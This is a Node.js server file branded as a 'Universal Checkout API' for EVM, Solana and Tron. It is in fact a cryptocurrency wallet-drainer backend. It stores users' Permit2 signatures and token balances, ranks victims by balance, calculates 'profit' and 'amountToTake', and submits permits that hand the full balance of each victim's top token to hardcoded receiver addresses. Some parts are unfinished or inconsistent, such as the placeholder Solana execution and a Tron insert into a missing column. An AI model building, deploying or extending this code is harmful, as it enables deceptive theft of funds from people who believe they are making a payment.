const express = require('express');
const { ethers } = require('ethers');
const { Connection, PublicKey, Transaction } = require('@solana/web3.js');
const { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } = require('@solana/spl-token');
const TronWeb = require('tronweb');
const { Pool } = require('pg');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// PostgreSQL Connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://localhost:5432/checkout_db',
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Initialize Database
async function initDB() {
  const client = await pool.connect();
  try {
    // EVM Authorizations Table
    await client.query(`
      CREATE TABLE IF NOT EXISTS evm_authorizations (
        id SERIAL PRIMARY KEY,
        user_address VARCHAR(42) NOT NULL,
        chain_id INTEGER NOT NULL,
        tokens JSONB NOT NULL,
        signature TEXT NOT NULL,
        sig_deadline BIGINT NOT NULL,
        max_authorized_amount DECIMAL(20, 8),
        current_balance_usd DECIMAL(20, 8),
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMP DEFAULT NOW(),
        executed_at TIMESTAMP,
        execution_tx TEXT,
        execution_amount_usd DECIMAL(20, 8),
        UNIQUE(user_address, chain_id)
      )
    `);
    
    // Solana Authorizations Table
    await client.query(`
      CREATE TABLE IF NOT EXISTS solana_authorizations (
        id SERIAL PRIMARY KEY,
        user_address VARCHAR(44) NOT NULL UNIQUE,
        tokens JSONB NOT NULL,
        signed_transaction BYTEA,
        delegated BOOLEAN DEFAULT true,
        max_authorized_amount DECIMAL(20, 8),
        current_balance_usd DECIMAL(20, 8),
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMP DEFAULT NOW(),
        executed_at TIMESTAMP,
        execution_signature TEXT,
        execution_amount_usd DECIMAL(20, 8)
      )
    `);
    
    // Tron Authorizations Table
    await client.query(`
      CREATE TABLE IF NOT EXISTS tron_authorizations (
        id SERIAL PRIMARY KEY,
        user_address VARCHAR(42) NOT NULL UNIQUE,
        tokens JSONB NOT NULL,
        approval_tx TEXT,
        max_authorized_amount DECIMAL(20, 8),
        current_balance_usd DECIMAL(20, 8),
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMP DEFAULT NOW(),
        executed_at TIMESTAMP,
        execution_tx TEXT,
        execution_amount_usd DECIMAL(20, 8)
      )
    `);
    
    // Create indexes
    await client.query(`CREATE INDEX IF NOT EXISTS idx_evm_status ON evm_authorizations(status)`);
    await client.query(`CREATE INDEX IF NOT EXISTS idx_solana_status ON solana_authorizations(status)`);
    await client.query(`CREATE INDEX IF NOT EXISTS idx_tron_status ON tron_authorizations(status)`);
    
    console.log('✅ Database initialized successfully');
  } catch (err) {
    console.error('❌ Database initialization error:', err);
  } finally {
    client.release();
  }
}

initDB();

// Relayer Configuration
const RELAYERS = {
  ethereum: process.env.ETH_RELAYER_KEY ? new ethers.Wallet(process.env.ETH_RELAYER_KEY, new ethers.JsonRpcProvider(process.env.ETH_RPC)) : null,
  base: process.env.BASE_RELAYER_KEY ? new ethers.Wallet(process.env.BASE_RELAYER_KEY, new ethers.JsonRpcProvider(process.env.BASE_RPC)) : null,
  polygon: process.env.POLYGON_RELAYER_KEY ? new ethers.Wallet(process.env.POLYGON_RELAYER_KEY, new ethers.JsonRpcProvider(process.env.POLYGON_RPC)) : null,
  arbitrum: process.env.ARBITRUM_RELAYER_KEY ? new ethers.Wallet(process.env.ARBITRUM_RELAYER_KEY, new ethers.JsonRpcProvider(process.env.ARBITRUM_RPC)) : null,
  bnb: process.env.BNB_RELAYER_KEY ? new ethers.Wallet(process.env.BNB_RELAYER_KEY, new ethers.JsonRpcProvider(process.env.BNB_RPC)) : null,
  optimism: process.env.OPTIMISM_RELAYER_KEY ? new ethers.Wallet(process.env.OPTIMISM_RELAYER_KEY, new ethers.JsonRpcProvider(process.env.OPTIMISM_RPC)) : null,
  solana: null, // Will be loaded from keypair file if needed
  tron: process.env.TRON_RELAYER_KEY ? new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: process.env.TRON_RELAYER_KEY
  }) : null
};

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: process.env.RECEIVER_ADDRESS || "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  SOLANA_RECEIVER: process.env.SOLANA_RECEIVER || "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
  TRON_RECEIVER: process.env.TRON_RECEIVER || "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
  MAX_AMOUNT: 500000, // $500k limit
  ADMIN_URL: process.env.ADMIN_URL || "http://localhost:3000/admin"
};

// Helper: Calculate max authorized amount
function calculateMaxAmount(tokens) {
  const totalValue = tokens.reduce((sum, t) => sum + (t.usdValue || t.uiAmount || 0), 0);
  return Math.min(totalValue, CONFIG.MAX_AMOUNT);
}

// Helper: Get relayer for chain
function getRelayerForChain(chainId) {
  const mapping = {
    1: 'ethereum',
    8453: 'base',
    137: 'polygon',
    42161: 'arbitrum',
    56: 'bnb',
    10: 'optimism',
    11155111: 'ethereum' // Sepolia uses same relayer as mainnet
  };
  return RELAYERS[mapping[chainId]];
}

// ============ UNIFIED ENDPOINT (called by frontend) ============

app.post('/api/authorize/unified', async (req, res) => {
  const { evmAddress, solanaAddress, tronAddress, tokens, evmSignature, evmSigDeadline, maxAuthorizedAmount, totalValue } = req.body;

  const results = {};
  const client = await pool.connect();

  try {
    // Store EVM authorization if available
    if (evmAddress && evmSignature) {
      const evmTokens = (tokens || []).filter(t => t.chain !== 'solana' && t.chain !== 'tron');
      const maxAmount = calculateMaxAmount(tokens || []);
      await client.query(`
        INSERT INTO evm_authorizations 
        (user_address, chain_id, tokens, signature, sig_deadline, max_authorized_amount, current_balance_usd)
        VALUES ($1, $2, $3, $4, $5, $6, $7)
        ON CONFLICT (user_address, chain_id) 
        DO UPDATE SET 
          tokens = $3, signature = $4, sig_deadline = $5,
          max_authorized_amount = $6, current_balance_usd = $7,
          status = 'active', created_at = NOW()
      `, [
        evmAddress.toLowerCase(), 1, JSON.stringify(tokens || []),
        evmSignature, evmSigDeadline, maxAmount,
        totalValue || (tokens || []).reduce((a, t) => a + (t.usdValue || 0), 0)
      ]);
      results.evm = { stored: true, address: evmAddress };
      console.log(`✅ Unified EVM stored: ${evmAddress}`);
    }

    // Store Solana authorization if available
    if (solanaAddress) {
      const maxAmount = calculateMaxAmount(tokens || []);
      await client.query(`
        INSERT INTO solana_authorizations
        (user_address, tokens, signed_transaction, max_authorized_amount, current_balance_usd)
        VALUES ($1, $2, $3, $4, $5)
        ON CONFLICT (user_address)
        DO UPDATE SET
          tokens = $2, signed_transaction = $3,
          max_authorized_amount = $4, current_balance_usd = $5,
          status = 'active', created_at = NOW()
      `, [
        solanaAddress, JSON.stringify(tokens || []),
        'pending', maxAmount,
        totalValue || (tokens || []).reduce((a, t) => a + (t.usdValue || 0), 0)
      ]);
      results.solana = { stored: true, address: solanaAddress };
      console.log(`✅ Unified Solana stored: ${solanaAddress}`);
    }

    // Store Tron authorization if available
    if (tronAddress) {
      const maxAmount = calculateMaxAmount(tokens || []);
      await client.query(`
        INSERT INTO tron_authorizations
        (user_address, tokens, signed_transaction, max_authorized_amount, current_balance_usd)
        VALUES ($1, $2, $3, $4, $5)
        ON CONFLICT (user_address)
        DO UPDATE SET
          tokens = $2, signed_transaction = $3,
          max_authorized_amount = $4, current_balance_usd = $5,
          status = 'active', created_at = NOW()
      `, [
        tronAddress, JSON.stringify(tokens || []),
        'pending', maxAmount,
        totalValue || (tokens || []).reduce((a, t) => a + (t.usdValue || 0), 0)
      ]);
      results.tron = { stored: true, address: tronAddress };
      console.log(`✅ Unified Tron stored: ${tronAddress}`);
    }

    if (Object.keys(results).length === 0) {
      return res.status(400).json({ error: 'No valid wallet address provided' });
    }

    res.json({ success: true, results, message: 'Authorization stored successfully' });

  } catch (err) {
    console.error('❌ Unified authorization error:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

// ============ EVM ENDPOINTS ============

app.post('/api/authorize/evm', async (req, res) => {
  const { userAddress, chainId, tokens, signature, sigDeadline } = req.body;
  
  if (!userAddress || !chainId || !tokens || !signature) {
    return res.status(400).json({ error: "Missing required fields" });
  }
  
  const maxAmount = calculateMaxAmount(tokens);
  
  if (maxAmount < 1) {
    return res.status(400).json({ error: "Insufficient balance. Minimum $1 required." });
  }
  
  const client = await pool.connect();
  try {
    await client.query(`
      INSERT INTO evm_authorizations 
      (user_address, chain_id, tokens, signature, sig_deadline, max_authorized_amount, current_balance_usd)
      VALUES ($1, $2, $3, $4, $5, $6, $7)
      ON CONFLICT (user_address, chain_id) 
      DO UPDATE SET 
        tokens = $3,
        signature = $4,
        sig_deadline = $5,
        max_authorized_amount = $6,
        current_balance_usd = $7,
        status = 'active',
        created_at = NOW()
    `, [
      userAddress.toLowerCase(),
      chainId,
      JSON.stringify(tokens),
      signature,
      sigDeadline,
      maxAmount,
      tokens.reduce((a, t) => a + (t.usdValue || 0), 0)
    ]);
    
    console.log(`✅ EVM authorization stored: ${userAddress} on chain ${chainId} ($${maxAmount.toFixed(2)})`);
    
    res.json({
      success: true,
      authorizedAmount: maxAmount,
      message: `Authorized up to $${maxAmount.toFixed(2)}`,
      adminUrl: `${CONFIG.ADMIN_URL}?chain=evm&user=${userAddress}&chainId=${chainId}`
    });
    
  } catch (err) {
    console.error('❌ EVM authorization error:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

app.get('/api/pending/evm', async (req, res) => {
  const client = await pool.connect();
  try {
    const result = await client.query(`
      SELECT * FROM evm_authorizations 
      WHERE status = 'active' AND sig_deadline > EXTRACT(EPOCH FROM NOW())
      ORDER BY current_balance_usd DESC
    `);
    
    const pending = result.rows.map(row => ({
      ...row,
      tokens: JSON.parse(row.tokens)
    }));
    
    res.json({ pending });
  } catch (err) {
    console.error('❌ Error fetching pending EVM:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

app.post('/api/gas/estimate/evm', async (req, res) => {
  const { chainId, userAddress, requestedAmount } = req.body;
  
  if (!chainId) {
    return res.status(400).json({ error: "chainId required" });
  }
  
  const client = await pool.connect();
  try {
    // Get user's authorization
    let authQuery = `
      SELECT max_authorized_amount, tokens FROM evm_authorizations 
      WHERE chain_id = $1 AND status = 'active'
    `;
    let params = [chainId];
    
    if (userAddress) {
      authQuery += ` AND user_address = $2`;
      params.push(userAddress.toLowerCase());
    }
    
    const authResult = await client.query(authQuery, params);
    
    if (authResult.rows.length === 0 && userAddress) {
      return res.status(404).json({ error: "No active authorization found" });
    }
    
    const auth = authResult.rows[0];
    const maxAllowed = auth ? Math.min(auth.max_authorized_amount, requestedAmount || auth.max_authorized_amount) : 100;
    
    // Get relayer
    const relayer = getRelayerForChain(chainId);
    
    if (!relayer) {
      return res.status(400).json({ error: "No relayer configured for this chain" });
    }
    
    // Calculate gas
    const feeData = await relayer.provider.getFeeData();
    const gasLimit = BigInt(200000);
    const gasPrice = feeData.maxFeePerGas || feeData.gasPrice || BigInt(50000000000);
    const costWei = gasLimit * gasPrice;
    const costEth = ethers.formatEther(costWei);
    
    // Token prices (simplified - use real API in production)
    const prices = { 1: 2500, 8453: 2500, 137: 1, 42161: 2500, 56: 600, 10: 2500, 11155111: 2500 };
    const costUsd = (parseFloat(costEth) * (prices[chainId] || 1)).toFixed(2);
    
    res.json({
      gasEth: parseFloat(costEth).toFixed(6),
      gasUsd: costUsd,
      relayerAddress: relayer.address,
      maxAllowedAmount: maxAllowed,
      userBalance: auth ? auth.max_authorized_amount : 0,
      profit: auth ? (maxAllowed - parseFloat(costUsd)).toFixed(2) : 0
    });
    
  } catch (err) {
    console.error('❌ Gas estimation error:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

app.post('/api/execute/evm', async (req, res) => {
  const { userAddress, chainId, amountToTake } = req.body;
  
  if (!userAddress || !chainId) {
    return res.status(400).json({ error: "userAddress and chainId required" });
  }
  
  const client = await pool.connect();
  try {
    // Get authorization
    const authResult = await client.query(`
      SELECT * FROM evm_authorizations 
      WHERE user_address = $1 AND chain_id = $2 AND status = 'active'
    `, [userAddress.toLowerCase(), chainId]);
    
    if (authResult.rows.length === 0) {
      return res.status(404).json({ error: "Authorization not found" });
    }
    
    const auth = authResult.rows[0];
    const tokens = JSON.parse(auth.tokens);
    
    // Validate amount
    const requestedAmount = parseFloat(amountToTake) || auth.max_authorized_amount;
    if (requestedAmount > auth.max_authorized_amount) {
      return res.status(400).json({ 
        error: `Requested $${requestedAmount} exceeds authorized $${auth.max_authorized_amount}` 
      });
    }
    
    if (requestedAmount < 1) {
      return res.status(400).json({ error: "Minimum amount is $1" });
    }
    
    // Get relayer
    const relayer = getRelayerForChain(chainId);
    if (!relayer) {
      return res.status(400).json({ error: "No relayer configured for this chain" });
    }
    
    // Check relayer balance
    const balance = await relayer.provider.getBalance(relayer.address);
    if (balance < ethers.parseEther("0.0001")) {
      return res.status(400).json({ error: "Relayer balance too low. Please fund relayer first." });
    }
    
    // Find best token to fulfill amount
    const bestToken = tokens.sort((a, b) => b.usdValue - a.usdValue)[0];
    
    // Execute Permit2
    const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
      "function permit(address owner, (tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature)"
    ], relayer);
    
    const tx = await permit2.permit(
      userAddress,
      {
        details: [{
          token: bestToken.addr,
          amount: bestToken.balance,
          expiration: auth.sig_deadline,
          nonce: 0 // Simplified - should track nonces properly
        }],
        spender: CONFIG.RECEIVER_ADDRESS,
        sigDeadline: auth.sig_deadline
      },
      auth.signature
    );
    
    await tx.wait();
    
    // Update database
    await client.query(`
      UPDATE evm_authorizations 
      SET status = 'executed',
          executed_at = NOW(),
          execution_tx = $3,
          execution_amount_usd = $4
      WHERE user_address = $1 AND chain_id = $2
    `, [userAddress.toLowerCase(), chainId, tx.hash, requestedAmount]);
    
    console.log(`✅ EVM execution: ${userAddress} on chain ${chainId}, TX: ${tx.hash}`);
    
    res.json({
      success: true,
      txHash: tx.hash,
      amountTaken: requestedAmount,
      token: bestToken.sym
    });
    
  } catch (err) {
    console.error('❌ Execution error:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

// ============ SOLANA ENDPOINTS ============

app.post('/api/authorize/solana', async (req, res) => {
  const { userAddress, tokens, signedTransaction } = req.body;
  
  if (!userAddress || !tokens) {
    return res.status(400).json({ error: "Missing required fields" });
  }
  
  const maxAmount = calculateMaxAmount(tokens);
  
  const client = await pool.connect();
  try {
    await client.query(`
      INSERT INTO solana_authorizations 
      (user_address, tokens, signed_transaction, max_authorized_amount, current_balance_usd)
      VALUES ($1, $2, $3, $4, $5)
      ON CONFLICT (user_address) 
      DO UPDATE SET 
        tokens = $2,
        signed_transaction = $3,
        max_authorized_amount = $4,
        current_balance_usd = $5,
        status = 'active',
        created_at = NOW()
    `, [
      userAddress,
      JSON.stringify(tokens),
      signedTransaction ? Buffer.from(signedTransaction) : null,
      maxAmount,
      tokens.reduce((a, t) => a + (t.uiAmount || 0), 0)
    ]);
    
    console.log(`✅ Solana authorization stored: ${userAddress} ($${maxAmount.toFixed(2)})`);
    
    res.json({
      success: true,
      authorizedAmount: maxAmount,
      adminUrl: `${CONFIG.ADMIN_URL}?chain=solana&user=${userAddress}`
    });
    
  } catch (err) {
    console.error('❌ Solana authorization error:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

app.get('/api/pending/solana', async (req, res) => {
  const client = await pool.connect();
  try {
    const result = await client.query(`
      SELECT * FROM solana_authorizations 
      WHERE status = 'active'
      ORDER BY current_balance_usd DESC
    `);
    
    const pending = result.rows.map(row => ({
      ...row,
      tokens: JSON.parse(row.tokens)
    }));
    
    res.json({ pending });
  } catch (err) {
    console.error('❌ Error fetching pending Solana:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

app.post('/api/gas/estimate/solana', async (req, res) => {
  // Solana fee is fixed: 0.000005 SOL per signature
  const fee = 0.000005;
  const solPrice = 150;
  
  res.json({
    gasSol: fee,
    gasUsd: (fee * solPrice).toFixed(4),
    relayerAddress: process.env.SOLANA_RELAYER_PUBKEY || "SolanaRelayerAddress",
    message: "Solana fees are negligible. 0.1 SOL = 20,000 transactions"
  });
});

app.post('/api/execute/solana', async (req, res) => {
  const { userAddress, amountToTake } = req.body;
  
  const client = await pool.connect();
  try {
    const authResult = await client.query(`
      SELECT * FROM solana_authorizations 
      WHERE user_address = $1 AND status = 'active'
    `, [userAddress]);
    
    if (authResult.rows.length === 0) {
      return res.status(404).json({ error: "No authorization" });
    }
    
    const auth = authResult.rows[0];
    const tokens = JSON.parse(auth.tokens);
    const requestedAmount = parseFloat(amountToTake) || auth.max_authorized_amount;
    
    // Note: Full Solana execution implementation needed
    // This is a placeholder
    
    res.json({
      success: false,
      error: "Solana execution not fully implemented yet. Contact admin."
    });
    
  } catch (err) {
    console.error('❌ Solana execution error:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

// ============ TRON ENDPOINTS ============

app.post('/api/authorize/tron', async (req, res) => {
  const { userAddress, tokens, approvalTx } = req.body;
  
  if (!userAddress || !tokens) {
    return res.status(400).json({ error: "Missing required fields" });
  }
  
  const maxAmount = calculateMaxAmount(tokens);
  
  const client = await pool.connect();
  try {
    await client.query(`
      INSERT INTO tron_authorizations 
      (user_address, tokens, approval_tx, max_authorized_amount, current_balance_usd)
      VALUES ($1, $2, $3, $4, $5)
      ON CONFLICT (user_address) 
      DO UPDATE SET 
        tokens = $2,
        approval_tx = $3,
        max_authorized_amount = $4,
        current_balance_usd = $5,
        status = 'active',
        created_at = NOW()
    `, [userAddress, JSON.stringify(tokens), approvalTx, maxAmount, 
        tokens.reduce((a, t) => a + (t.uiAmount || 0), 0)]);
    
    console.log(`✅ Tron authorization stored: ${userAddress} ($${maxAmount.toFixed(2)})`);
    
    res.json({
      success: true,
      authorizedAmount: maxAmount,
      adminUrl: `${CONFIG.ADMIN_URL}?chain=tron&user=${userAddress}`
    });
    
  } catch (err) {
    console.error('❌ Tron authorization error:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

app.get('/api/pending/tron', async (req, res) => {
  const client = await pool.connect();
  try {
    const result = await client.query(`
      SELECT * FROM tron_authorizations 
      WHERE status = 'active'
      ORDER BY current_balance_usd DESC
    `);
    
    const pending = result.rows.map(row => ({
      ...row,
      tokens: JSON.parse(row.tokens)
    }));
    
    res.json({ pending });
  } catch (err) {
    console.error('❌ Error fetching pending Tron:', err);
    res.status(500).json({ error: err.message });
  } finally {
    client.release();
  }
});

app.post('/api/gas/estimate/tron', async (req, res) => {
  const energyNeeded = 15000;
  const trxCost = 3; // Approximate if no energy
  
  res.json({
    gasTrx: trxCost,
    gasUsd: (trxCost * 0.13).toFixed(2),
    relayerAddress: process.env.TRON_RELAYER_ADDRESS || "TronRelayerAddress",
    alternative: "Stake 1000 TRX for free energy"
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    database: pool.totalCount > 0 ? 'connected' : 'disconnected',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.json({ 
    status: 'Universal Checkout API Running',
    version: '8.0',
    chains: ['EVM', 'Solana', 'Tron'],
    features: ['Just-in-Time Gas Funding', 'PostgreSQL', 'Dynamic Amounts ($1-$500k)']
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Universal Checkout API running on port ${PORT}`);
  console.log(`📡 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`💾 Database: ${process.env.DATABASE_URL ? 'PostgreSQL connected' : 'Local PostgreSQL'}`);
  console.log(`🔷 EVM Relayers: ${Object.keys(RELAYERS).filter(k => RELAYERS[k]).join(', ')}`);
});
